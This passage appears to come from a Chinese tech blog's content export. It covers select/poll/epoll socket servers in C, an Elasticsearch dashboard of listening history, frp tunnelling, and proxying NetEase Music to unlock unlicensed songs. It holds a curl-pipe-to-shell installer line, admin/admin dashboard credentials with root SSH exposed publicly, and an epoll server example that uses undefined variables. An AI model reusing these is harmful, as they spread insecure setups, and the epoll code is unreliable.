(clients[i].fd < 0) {\n\t\t\t\t\tclients[i].fd = client_id;\t\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tif (i == OPEN_MAX) {\n\t\t\t\tfputs(\"too many clients\\n\", stderr);\n\t\t\t\texit(1);\n\t\t\t}\n\n\t\t\tclients[i].events = POLLIN;\n\t\t\tif (i > maxi) {\n\t\t\t\tmaxi = i;\n\t\t\t}\n\t\t\tif (--iready == 0) {\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tfor (int i = 1; i <= maxi; ++i) {\n\t\t\tif (clients[i].fd < 0) {\n\t\t\t\tcontinue;\n\t\t\t}\t\n\n\t\t\tif (clients[i].revents & POLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\t\t\t\t\tclients[i].fd = -1;\n\t\t\t\t} else {\n\t\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t\t}\n\t\t\t\t\tWrite(clients[i].fd, buf, n);\n\t\t\t\t}\n\t\t\t\tif (--iready == 0) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include \"wrap.h\"\n\n\n#define PORT 8000\n#define MAXLINE 1024\nint main(int argc, char* agrv[])\n{\n\tchar buf[MAXLINE];\n\tmemset(buf, 0, sizeof(buf));\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(PF_INET, \"127.0.0.1\", &server.sin_addr);\n\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\twhile (fgets(buf, MAXLINE, stdin) != NULL) {\n\t\tWrite(server_id, buf, strlen(buf));\n\t\tint n = Read(server_id, buf, MAXLINE);\n\t\tif (n == 0) {\n\t\t\tprintf(\"the other side has been closed.\\n\");\n\t\t} else {\n\t\t\tWrite(STDOUT_FILENO, buf, n);\n\t\t}\n\t}\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.3 epoll\n\n`server.c`\n\n```c\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <sys/uio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <unistd.h>\n#include <ctype.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n#include <sys/epoll.h>\n#include \"wrap.h\"\n\n#define PORT 8000\n#define MAXLINE 1024\n#define OPEN_MAX 1000\n\nvoid add_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_ADD, fd, &ev);\n}\nvoid modify_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_MOD, fd, &ev);\n}\nvoid delete_event(int epollid, int fd, int state)\n{\n\tstruct epoll_event ev;\n\tev.data.fd = fd;\n\tev.events = state;\n\tepoll_ctl(epollid, EPOLL_CTL_DEL, fd, &ev);\n}\n\n\nint main()\n{\n\tchar buf[MAXLINE];\n\tchar str[INET_ADDRSTRLEN];\n\tint server_id = Socket(PF_INET, SOCK_STREAM, 0);\n\n\tstruct sockaddr_in server, client;\n\tbzero(&server, sizeof(server));\t\n\tserver.sin_family = PF_INET;\n\tserver.sin_port = htons(PORT);\n\tserver.sin_addr.s_addr = htonl(INADDR_ANY);\n\t\n\tint opt = 1;\n\tsetsockopt(server_id, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));\n\n\tBind(server_id, (struct sockaddr*)&server, sizeof(server));\n\tListen(server_id, 20);\n\tprintf(\"Accept connections...\\n\");\n\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FDSIZE);\n\n\tstruct epoll_event ev;\n\tev.events = EPOLLIN;\n\tev.data.fd = STDIN_FILENO;\n\tepoll_ctl(epollfd, EPOLL_CTL_ADD, STDIN_FILENO, &ev);\n\n\twhile (1) {\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\t\t\tif (fd == server_id && (events[i].events & EPOLLIN)) {\n\t\t\t\tsocklen_t len = sizeof(client);\n\t\t\t\tint client_id = Accept(server_id, (struct sockaddr*)&client, &len);\t\n\t\t\t\tprintf(\"received from %s at PORT %d\\n\",\n\t\t\t\t\t\tinet_ntop(PF_INET, &client.sin_addr, str, sizeof(str)),\n\t\t\t\t\t\tntohs(client.sin_port));\n\n\t\t\t\tstruct epoll_event ev;\n\t\t\t\tev.events = state;\n\t\t\t\tev.data.fd = fd;\n\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_ADD,fd,&ev);\n\n\t\t\t} else if (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(clients[i].fd, buf, sizeof(buf));\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(clients[i].fd);\n\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLOUT;//由读改为写\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tfor (int i = 0; i < n; ++i) {\n\t\t\t\t\tbuf[i] = toupper(buf[i]);\n\t\t\t\t}\n\t\t\t\tint n = Write(fd, buf, n);\n\t\t\t\tif (n < 0) {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_DEL,fd,&ev);\n\n\t\t\t\t} else {\n\t\t\t\t\tstruct epoll_event ev;\n\t\t\t\t\tev.events = EPOLLIN;//由写改为读\n\t\t\t\t\tev.data.fd = fd;\n\t\t\t\t\tepoll_ctl(epollfd,EPOLL_CTL_MOD,fd,&ev);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(epollfd);\n\n\n\treturn 0;\n}\n```\n\n\n\n`client.c`\n\n```c\n#include <string.h>\n#include <sys/socket.h>\n#include <sys/epoll.h>\n#include <arpa/inet.h>\n#include <string.h>\n#include <stdio.h>\n#include <unistd.h>\n#include \"wrap.h\"\n#include \"epollUtil.h\"\n\n#define IP \"127.0.0.1\"\n#define PORT 8000\n#define FD_SIZE 1024\n#define EPOLLEVENTS 20\nint main(int agrc, char* argv[]) {\n\tchar buf[1024];\n\tmemset(buf, 0, sizeof(buf));\n\n\tstruct sockaddr_in server;\n\tbzero(&server, sizeof(server));\n\tserver.sin_family = AF_INET;\n\tserver.sin_port = htons(PORT);\n\tinet_pton(AF_INET, IP, &server.sin_addr);\n\t\n\n\tint server_id = Socket(AF_INET, SOCK_STREAM, 0);\n\tConnect(server_id, (struct sockaddr*)&server, sizeof(server));\n\n\tstruct epoll_event events[EPOLLEVENTS];\n\tint epollfd = epoll_create(FD_SIZE);\n\tadd_event(epollfd, STDIN_FILENO, EPOLLIN);\n\twhile (1) {\n\t\n\t\tint ret = epoll_wait(epollfd, events, EPOLLEVENTS, -1);\n\t\tfor (int i = 0; i < ret; ++i) {\n\t\t\tint fd = events[i].data.fd;\n\n\t\t\tif (events[i].events & EPOLLIN) {\n\t\t\t\tint n = Read(fd, buf, sizeof(buf));\t\n\t\t\t\tif (n == 0) {\n\t\t\t\t\tClose(fd);\t\n\t\t\t\t} else {\n\t\t\t\t\tif (fd == STDIN_FILENO) {\n\t\t\t\t\t\tadd_event(epollfd, server_id, EPOLLOUT);\n\t\t\t\t\t} else {\n\t\t\t\t\t\tdelete_event(epollfd, server_id, EPOLLIN);\t\n\t\t\t\t\t\tadd_event(epollfd, STDOUT_FILENO, EPOLLOUT);\n\t\t\t\t\t}\t\n\t\t\t\t}\n\t\t\t} else if (events[i].events & EPOLLOUT) {\n\t\t\t\tWrite(fd, buf, strlen(buf));\t\n\t\t\t\tif (fd == STDOUT_FILENO) {\n\t\t\t\t\tdelete_event(epollfd, fd, EPOLLOUT);\n\t\t\t\t} else {\n\t\t\t\t\tmodify_event(epollfd, fd, EPOLLIN);\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t}\n\n\tClose(server_id);\n\treturn 0;\n}\n```\n\n\n\n### 4.4 总结\n\n+ select \n\n  死循环里用 select 阻塞, 返回后开始遍历\n\n+ poll\n\n  死循环里用 poll 阻塞, 返回后开始遍历\n\n+ epoll\n\n  死循环里用 epoll_wait 阻塞\n\n\n\n# 5. 头脑风暴\n\n### 5.1  【多路复用】VS 【多线程+ 阻塞IO】\n\n也许有朋友会说，我可以采用 多线程+ 阻塞IO 达到类似的效果，但是由于在多线程 + 阻塞IO 中，每个socket对应一个线程，这样会造成很大的资源占用，并且尤其是对于长连接来说，线程的资源一直不会释放，如果后面陆续有很多连接的话，就会造成性能上的瓶颈。\n\n而多路复用IO模式，通过一个线程就可以管理多个socket，只有当socket真正有读写事件发生才会占用资源来进行实际的读写操作。因此，多路复用IO比较适合连接数比较多的情况。\n\n另外多路复用IO为何比非阻塞IO模型的效率高是因为在非阻塞IO中，不断地询问socket状态时通过用户线程去进行的，而在多路复用IO中，轮询每个socket状态是内核在进行的，这个效率要比用户线程要高的多。\n\n\n\n### 5.2  我在知乎的回答\n\nhttps://www.zhihu.com/question/32163005/answer/300165049\n\nIO模式一般分为同步IO和异步IO. 同步IO会阻塞进程, 异步IO不会阻塞进程. 目前linux上大部分用的是同步IO, 异步IO在linux上目前还不成熟, 不过windows的iocp算是真正的异步IO。\n\n\n\n同步IO又分为阻塞IO, 非阻塞IO, IO多路复用. What? 同步IO明明会阻塞进程,为什么也包括非阻塞IO? 因为非阻塞IO虽然在请求数据时不阻塞, 但真正数据来临时,也就是内核数据拷贝到用户数据时, 此时进程是阻塞的.\n\n\n\n那么这些IO模式的区别分别是什么? 接下来举个小例子来说明. 假设你现在去女生宿舍楼找自己的女神, 但是你只知道女神的手机号,并不知道女神的具体房间\n\n\n\n先说同步IO的情况,\n\n1. 阻塞IO, 给女神发一条短信, 说我来找你了, 然后就默默的一直等着女神下楼, 这个期间除了等待你不会做其他事情, 属于备胎做法.\n\n\n\n2. 非阻塞IO, 给女神发短信, 如果不回, 接着再发, 一直发到女神下楼, 这个期间你可以在两次发短信间隙喝口水，属于专一做法.\n\n\n\n3. IO多路复用, 是找一个宿管大妈来帮你监视下楼的女生, 这个期间你可以些其他的事情. 例如可以顺便看看其他妹子,玩玩王者荣耀, 上个厕所等等. IO复用又包括 select, poll, epoll 模式. 那么它们的区别是什么?\n\n\n\n3.1 select大妈 每一个女生下楼, select大妈都不知道这个是不是你的女神, 她需要一个一个询问, 并且select大妈能力还有限, 最多一次帮你监视1024个妹子\n\n\n\n3.2 poll大妈不限制盯着女生的数量, 只要是经过宿舍楼门口的女生, 都会帮你去问是不是你女神\n\n\n\n3.3 epoll大妈不限制盯着女生的数量, 并且也不需要一个一个去问. 那么如何做呢? epoll大妈会为每个进宿舍楼的女生脸上贴上一个大字条,上面写上女生自己的名字, 只要女生下楼了, epoll大妈就知道这个是不是你女神了, 然后大妈再通知你.\n\n\n\n上面这些同步IO有一个共同点就是, 当女神走出宿舍门口的时候, 你已经站在宿舍门口等着女神的, 此时你属于阻塞状态\n\n\n\n接下来是异步IO的情况\n\n你告诉女神我来了, 然后你就去王者荣耀了, 一直到女神下楼了, 发现找不见你了, 女神再给你打电话通知你, 说我下楼了, 你在哪呢? 这时候你才来到宿舍门口. 此时属于逆袭做法\n\n# 6. 参考资料\n\n+ https://www.liuvv.com/p/9864e52a.html\n+ https://www.zhihu.com/question/59975081\n+ https://xiaolincoding.com/os/8_network_system/selete_poll_epoll.html\n\n\n\n","tags":["io"],"categories":["io"]},{"title":"elasticsearch展示网易云听歌记录","url":"%2Fp%2F84fd7308.html","content":"\n打工人每日网抑云, 所以就用 es简单做个网易云听歌记录. 先上效果图.\n\n![1](elasticsearch展示网易云听歌记录/1.png)\n\n<!-- more -->\n\n![1](elasticsearch展示网易云听歌记录/2.png)\n\n\n\n# 1. 前置条件\n\n### 1.1 代理请求\n\n如果想记录网易云听歌记录,  就要代理网易云请求. 使用了以下服务, 即能代理请求, 也能解锁灰色网抑云歌曲\n\nhttps://github.com/nondanee/UnblockNeteaseMusic\n\n### 1.2 格式化输出\n\n为了es 方便显示和搜索数据.  需要对统计的数据, 输出 json.\n\n所以需要修改上述服务, 自定义自己的格式化 json 输出.\n\n参考自己的定义结构:\n\nhttps://github.com/unix2dos/UnblockNeteaseMusic/commit/19232978dec11d260e1da846350101751e276143\n\n### 1.3 安装es\n\n参考: https://www.liuvv.com/p/4986eca1.html\n\n因为服务用的 systemctl 启动的, 为了方便, 没有使用 filebeat, 使用的 journalbeat 收集\n\n\n\n# 2. 配置\n\n### 2.1 journalbeat 配置\n\n因为自定义输出了 json, 所以需要beat自动解析 json 字段, 输出到 es 里面.\n\n注意把`decode_json_fields` 放在了`drop_fields`的上面, 因为解析`message` json后, 再放弃原生的`message`信息.\n\n+ journalbeat.yml\n\n```\nprocessors:\n  - decode_json_fields:\n      fields: [\"message\"]\n      process_array: true\n      max_depth: 10\n      target: \"\"\n      overwrite_keys: true\n\n  - drop_fields:\n      fields: [\"message\", \"journald\", \"syslog\", \"log\", \"host\", \"event\", \"ecs\", \"agent\", \"process\", \"systemd\"]\n```\n\n\n\n+ 启动错误1\n\n  Failed to connect to backoff(elasticsearch(http://localhost:9200)): Connection marked as failed because the onConnect callback failed: resource 'journalbeat-7.10.2' exists, but it is not an alias\n\n  \n\n  重新删除索引, 再次启动程序,  在 index 那里出现两个, 一个 index, 一个 alias 即可解决.\n\n\n\n+ 启动错误2 \n\n  object mapping for [url] tried to parse field [url] as object, but found a concrete value\n\n  \n\n  因为url 是关键词, 需要在 url 的前面增加了前缀,  例如`lw_url`.\n\n\n\n### 2.2 json字段增加索引\n\n\n去建立索引的地方刷新即可.\n\n![1](elasticsearch展示网易云听歌记录/3.png)\n\n\n\n# 3. 显示\n\n### 3.1 row分段\n\nAdd Sub-Bucket ->Terms, 选择指定字段\n![1](elasticsearch展示网易云听歌记录/4.png)\n\n\n### 3.2 歌曲增加 play\n\n去索引管理, 字段编辑, string -> url -> audio\n\n![1](elasticsearch展示网易云听歌记录/6.png)\n\n\n\n### 3.3 替换字段内容\n\n去索引管理, 字段编辑, string -> string Static lookup\n![1](elasticsearch展示网易云听歌记录/5.png)\n\n\n\n### 3.4 替换字段名字\n\n 7.10.1版本还不支持, 7.11.0版本已经支持\n\n参考这个提交: https://github.com/elastic/kibana/pull/70039\n\n\n\n# 4. 获取数据\n\n+ 查看所有索引\n\n``` bash\nGET /_cat/indices?v\n```\n\n+ 查询指定字段数据\n\n``` bash\nGET _search\n{\n  \"query\": {\n    \"match\": {\n      \"lw_value.name\": \"双截棍\"\n    }\n  }\n}\n```\n\n+ 查询字段为空的数据\n\n``` bash\nGET _search\n{\n  \"query\": {\n    \"bool\": {\n      \"must_not\": {\n        \"exists\": {\n          \"field\": \"lw_value.name\"\n        }\n      }\n    }\n  }\n}\n```\n\n+ 删除查询数据\n\n``` bash\nPOST /journalbeat-7.10.2-2021.01.24-000001/_delete_by_query\n{\n  \"query\": {\n    \"bool\": {\n      \"must_not\": {\n        \"exists\": {\n          \"field\": \"lw_value.name\"\n        }\n      }\n    }\n  }\n}\n```\n\n\n\n# 5. 参考资料\n\n+ https://elasticstack.blog.csdn.net/article/details/108146888","tags":["netease"],"categories":["elk"]},{"title":"frp内网穿透的实践","url":"%2Fp%2Fcc6fa0e8.html","content":"\n\n\n### 0. 为什么内网穿透\n\n从公网中访问自己的私有设备向来是一件难事儿。\n\n自己的主力台式机、NAS等等设备，它们可能处于路由器后，或者运营商因为IP地址短缺不给你分配公网IP地址。如果我们想直接访问到这些设备（远程桌面，远程文件，SSH等等），一般来说要通过一些转发或者P2P组网软件的帮助。\n\n<!-- more -->\n\n\n\n### 1. 安装配置 frp\n\nhttps://github.com/fatedier/frp/releases 下载最新的release\n\n##### 1.1服务端配置\n\n```bash\nsudo cp systemd/frps.service /lib/systemd/system/\n\n#  /usr/bin/frps -c /etc/frp/frps.ini\n# 我们按照 service 内的配置把文件拷贝到相应的地方\n\nsudo cp frps /usr/bin/frps\nsudo mkdir /etc/frp/\nsudo cp frps.ini /etc/frp/frps.ini\n\n# 编辑frps.ini\n\n\n# 开启 service\nsudo systemctl start frps\nsudo systemctl enable frps\n```\n\n\n\n##### 1.2 客户端\n\n```bash\nsudo cp systemd/frpc.service /lib/systemd/system/\n\nsudo cp frpc /usr/bin/frpc\nsudo mkdir /etc/frp/\nsudo cp frpc.ini /etc/frp/frpc.ini\n\n#编辑frpc.ini\n\n#1. 修改server_addr为服务端公网IP\n\n\n# 开启 service\nsudo systemctl start frpc\nsudo systemctl enable frpc\n```\n\n\n\n##### 1.3 测试\n\n主题frpc里面有ssh配置, 所以我们通过 ssh 访问内网机器：\n\n```bash\nssh -p 6000 root@49.234.15.70\n\n# 为了方便, 我们可以在~/.ssh/config 配置下面的话\n\nhost box\n    Hostname 49.234.15.70\n    Port 6000\n    user root\n```\n\n\n\n### 2. 自定义域名访问内网的 web 服务\n\n有时想要让其他人通过域名访问或者测试我们在本地搭建的 web 服务，但是由于本地机器没有公网 IP，无法将域名解析到本地的机器，通过 frp 就可以实现这一功能，以下示例为 http 服务，https 服务配置方法相同， vhost_http_port 替换为 vhost_https_port， type 设置为 https 即可。\n\n\n\n##### 2.1 修改 frps.ini\n\n设置 http 访问端口为 8080：\n\n```ini\n# frps.ini\n[common]\nbind_port = 7000\nvhost_http_port = 8080\n```\n\n\n\n##### 2.2 启动 frps：\n\n```bash\nsudo systemctl start frps\n```\n\n\n\n##### 2.3 修改frpc.ini\n\n修改 frpc.ini 文件，假设 frps 所在的服务器的 IP 为 x.x.x.x，local_port 为本地机器上 web 服务对应的端口, 绑定自定义域名 `www.yourdomain.com`:\n\n\n\n```ini\n# frpc.ini\n[common]\nserver_addr = x.x.x.x\nserver_port = 7000\n\n[web]\ntype = http\nlocal_port = 80\ncustom_domains = www.yourdomain.com\n```\n\n\n\n##### 2.4 启动 frpc：\n\n```bash\nsudo systemctl start frpc\n```\n\n\n\n##### 2.5 绑定域名映射\n\n将 `www.yourdomain.com` 的域名 A 记录解析到 IP `x.x.x.x`，如果服务器已经有对应的域名，也可以将 CNAME 记录解析到服务器原先的域名。\n\n通过浏览器访问 `http://www.yourdomain.com:8080` 即可访问到处于内网机器上的 web 服务。\n\n\n\n### 3. frp 管理面板\n\n服务端 frps 配置如下:\n\n```ini\n[common]\nbind_port = 7000\ndashboard_port = 5000\ndashboard_user = admin\ndashboard_pwd = admin\nvhost_http_port = 5001\n```\n\n然后我们通过 ip:5000,即可以访问到 web 管理界面.\n\n\n\n### 4. nginx 反向代理进行无端口访问\n\n##### 4.1 frp 相应配置\n\n+ frps\n\n  ```ini\n  [common]\n  bind_port = 7000\n  dashboard_port = 5000\n  dashboard_user = admin\n  dashboard_pwd = admin\n  vhost_http_port = 5001\n  ```\n\n  \n\n+ frpc\n\n  ```ini\n  [web]\n  type = http\n  local_port = 80\n  custom_domains = box.frp.liuvv.com\n  ```\n\n\n\n##### 4.2 在服务端架设 nginx\n\n1、 frp.liuvv.com 做A记录，解析至IP；\n\n2、 *.frp.liuvv.com 做CNAME记录，解析至 frp.liuvv.com;\n\n3、 配置nginx反向代理,将来自*.frp.liuvv.com的80端口请求，分发至frp服务器http请求的监听端口。\n\n```nginx\nserver {\n\n    listen 80;\n\n    server_name frp.liuvv.com;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5000;# dashboard\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n\nserver {\n\n    listen 80;\n\n    server_name *.frp.liuvv.com;\n\n    access_log /var/log/nginx/frp_access.log;\n\n    error_log /var/log/nginx/frp_error.log;\n\n    location / {\n\n        proxy_pass http://127.0.0.1:5001;# vhost_http\n\n        proxy_set_header    Host            $host:80;\n\n        proxy_set_header    X-Real-IP       $remote_addr;\n\n        proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;\n\n        proxy_hide_header   X-Powered-By;\n\n    }\n\n}\n```\n\n\n\n### 5.  远程桌面连接局域网mac\n\nmac去下载darwin_amd64,  然后启动客户端 frpc\n\n##### 5.1  开启屏幕共享\n\n在系统设置->共享->开启屏幕共享\n\n即开启了 vnc 服务\n\n\n\n##### 5.2 修改frpc配置\n\n```ini\n[common] \nserver_addr = 49.234.15.70\nserver_port = 7000\n\n[vnc] \ntype = tcp \nlocal_ip = 127.0.0.1 \nlocal_port = 5900 \nremote_port = 35900 \nuse_encryption = true \nuse_compression = true\n```\n\n\n\n##### 5.3 连接远程\n\n在 finder, cmd+k, 进行连接\n\n```ini\nvnc://49.234.15.70:35900\n```\n\n\n\n### 6. 参考资料:\n\n+ https://github.com/fatedier/frp/blob/master/README_zh.md\n\n+ https://www.iyuu.cn/archives/286/\n+ [实现MAC远程桌面](http://yuqiangcoder.com/2019/11/22/frp-内网穿透-实现MAC远程桌面.html)","tags":["frp"],"categories":["软件"]},{"title":"解锁网易云音乐灰色歌曲并试听","url":"%2Fp%2F3a9129d9.html","content":"\n谈起音乐软件，只钟情网易云音乐。奈何版权太少，歌单里好多音乐涉及到版权的问题无法听，即使开了黑胶VIP也不行。\n\n但是我们可以通过一些“奇淫技巧”来实现解锁灰色无版权歌曲，效果比开了黑胶VIP 还要强大。\n\n声明：本工具只提供大家免费测试学习使用，请勿用作任何商业用途。\n\n<!-- more -->\n\n# 1. 更新（2023-06-09）\n\n### 1.1 安装\n\nhttps://github.com/UnblockNeteaseMusic/server.git\n\n```bash\napt install nodejs #安装 node\n\ngit clone https://github.com/UnblockNeteaseMusic/server.git UnblockNeteaseMusic\ncd UnblockNeteaseMusic\nnode app.js\n```\n\n\n\n### 1.2 Nginx 配置\n\n##### 域名解析\n\n先把自己的域名 music.liuvv.com 解析到云服务器ip。\n\n##### 生成证书\n\n用 acme.sh 生成证书，参考: https://github.com/acmesh-official/acme.sh\n\n```bash\n# 安装 acme.sh\ncurl  https://get.acme.sh | sh\nalias acme.sh=~/.acme.sh/acme.sh\n\n# 生成证书\nmkdir -p /etc/nginx/ssl/music/\nacme.sh --issue -d music.liuvv.com -w /var/www/html\n\n# 安装证书\nacme.sh --install-cert -d music.liuvv.com --key-file /etc/nginx/ssl/music/key.pem --fullchain-file /etc/nginx/ssl/music/cert.pem --reloadcmd \"service nginx force-reload\"\n```\n\n##### Nginx 配置\n\n```nginx\n# cat /etc/nginx/sites-enabled/lw-music.conf\n\nserver {\n  listen 443;\n  server_name music.liuvv.com; # 改为自己的域名\n  access_log  /var/log/nginx/lw-music.log;\n\n  ssl on;\n  ssl_certificate /etc/nginx/ssl/music/cert.pem; # 改为自己申请得到的 crt 文件的名称\n  ssl_certificate_key /etc/nginx/ssl/music/key.pem; # 改为自己申请得到的 key 文件的名称\n  ssl_session_timeout 5m;\n  ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n  ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;\n  ssl_prefer_server_ciphers on;\n\n  location / {\n    proxy_pass http://localhost:8080; # 转发\n  }\n}\n\n\nserver {\n  listen 80;\n  server_name netease.liuvv.com;\n  location /{\n    proxy_pass http://localhost:8080/;\n  }\n}\n```\n\n##### 重启Nginx\n\n```bash\nsystemctl restart nginx # nginx -s reload 对证书无效\n```\n\n\n\n### 1.3 Systemctl 配置\n\n```bash\n# cat /lib/systemd/system/lw-music.service\n\n[Unit]\nDescription=lw-music\nAfter=network.target\n[Service]\nExecStart=/usr/local/bin/node /opt/liuwei/UnblockNeteaseMusic/app.js -e https://music.liuvv.com -s -p 8080:8081\nRestart=always\nRestartSec=5\nEnvironment=\"ENABLE_FLAC=true\"\nEnvironment=\"ENABLE_LOCAL_VIP=svip\"\nEnvironment=\"JSON_LOG=true\"\nEnvironment=\"LOG_LEVEL=debug\"\n[Install]\nWantedBy=default.target\n```\n\n 这里启动的参数格式是 node app.js -e 域名 -s -p  http端口:https端口\n\n\n\n##### 启动\n\n```bash\nsystemctl daemon-reload\nsystemctl start lw-music.service\nsystemctl enable lw-music.service\n```\n\n\n\n### 1.4  Mac 使用\n\n**安装CA证书**\n\n**Clashx Pro: netease.yaml** \n\n```ini\nproxies:\n  - { name: neteasemusic, type: http, server: 152.136.138.232, port: 8080 }\n\nproxy-groups:\n\nrules:\n  - PROCESS-NAME,NeteaseMusic,neteasemusic\n  - MATCH,DIRECT\n```\n\n启动增强模式（Enhanced mode），初次使用时要将Enhanced mode Config->DNS mode改为Mapping，就可以使用了\n\n\n\n### 1.5 iOS使用\n\n**Quantumnlt：netease.conf**\n\n```ini\n[policy]\nstatic=解锁网易云, 解锁网易云灰色音乐, direct, proxy, img-url=https://raw.githubusercontent.com/Koolson/Qure/master/IconSet/Color/Netease_Music_Unlock.png\n\n\n[filter_remote]\nhttps://raw.githubusercontent.com/GeQ1an/Rules/master/QuantumultX/Filter/Optional/Netease%20Music.list, tag=解锁网易云音乐, force-policy=解锁网易云, update-interval=172800, opt-parser=false, enabled=true\n\n\n[server_local]\nhttp=152.136.138.232:8080, fast-open=false, udp-relay=false, tag=解锁网易云灰色音乐\n```\n\n\n\n\n\n# 0. 项目介绍\n\n其原理是通过流量进入代理后来匹配网易链接进行劫持，然后将requests请求修改重新发送一个新的链接（这个链接就是provider的），请求到音乐以后再重新将provider的response改写成网易的，然后返回到应用，通俗的说是修改http请求和响应。\n\n整个配置参考了这个项目,  唯一不足的是教程散落在仓库的各大 issue. 因为只常用 ios 和 mac 的设备,所以只测试了这两个平台, 上测试效果图:\n\n<img src=\"解锁网易云音乐灰色歌曲并试听/2.jpg\" alt=\"1\" style=\"zoom: 33%;\" />\n\n<img src=\"解锁网易云音乐灰色歌曲并试听/1.jpg\" alt=\"2\" style=\"zoom:50%;\" />\n\n\n\n\n\n\n\n   \n\n# 2. ~~2022使用更新（废弃，请看2023更新）~~\n\n项目修改为： https://github.com/UnblockNeteaseMusic/server\n\n```bash\n# 安装最新的node\nnpm install -g n\nn latest\nhash -r \nnode -v\n\n# 下面教程请参考 本文 2.安装配置\ngit clone https://github.com/UnblockNeteaseMusic/server.git UnblockNeteaseMusic\ncd UnblockNeteaseMusic\nnode app.js\n```\n\n\n\n### 2.1 ios使用\n\n+ 下载小火箭\n+ 添加节点，类型选择 HTTP，服务器和端口号填写自己部署的服务器公网IP和端口。\n+ 软件底部配置->右上角加号->填写  http://files.liuvv.com/music.conf (下面配置)然后使用配置\n+ 回软件底部主页,开启VPN->Allow\n+ 打开手机网易云音乐,搜索周杰伦,播放\n\n```ini\n# Shadowrocket: 2020-06-11 19:05:03\n[General]\nbypass-system = true\nskip-proxy = 192.168.0.0/16, 10.0.0.0/8, 172.16.0.0/12, localhost, *.local, captive.apple.com\nbypass-tun = 10.0.0.0/8,100.64.0.0/10,127.0.0.0/8,169.254.0.0/16,172.16.0.0/12,192.0.0.0/24,192.0.2.0/24,192.88.99.0/24,192.168.0.0/16,198.18.0.0/15,198.51.100.0/24,203.0.113.0/24,224.0.0.0/4,255.255.255.255/32\ndns-server = system\nipv6 = false\n\n\n[Rule]\nDOMAIN-KEYWORD,google,PROXY\nDOMAIN-KEYWORD,facebook,PROXY\nDOMAIN-KEYWORD,youtube,PROXY\nDOMAIN-KEYWORD,twitter,PROXY\nDOMAIN-KEYWORD,instagram,PROXY\nDOMAIN-KEYWORD,gmail,PROXY\nDOMAIN-SUFFIX,twimg.com,PROXY\nDOMAIN-SUFFIX,t.co,PROXY\nDOMAIN-SUFFIX,kenengba.com,PROXY\nDOMAIN-SUFFIX,akamai.net,PROXY\nDOMAIN-SUFFIX,whatsapp.net,PROXY\nDOMAIN-SUFFIX,whatsapp.com,PROXY\nDOMAIN-SUFFIX,snapchat.com,PROXY\nDOMAIN-KEYWORD,pixiv,PROXY\nDOMAIN-SUFFIX,google.cn,DIRECT\nDOMAIN-SUFFIX,fb.com,PROXY\nDOMAIN-SUFFIX,ampproject.org,PROXY\nDOMAIN-SUFFIX,apple.com,DIRECT\nDOMAIN-SUFFIX,mzstatic.com,PROXY\nDOMAIN-SUFFIX,itunes.com,PROXY\nDOMAIN-SUFFIX,icloud.com,DIRECT\nDOMAIN-SUFFIX,icloud-content.com,DIRECT\nDOMAIN-SUFFIX,lcdn-registration.apple.com,DIRECT\nDOMAIN-KEYWORD,flurry.co,REJECT\nDOMAIN-SUFFIX,doubleclick.net,REJECT\nDOMAIN,bam.nr-data.net,REJECT\nDOMAIN,counter.k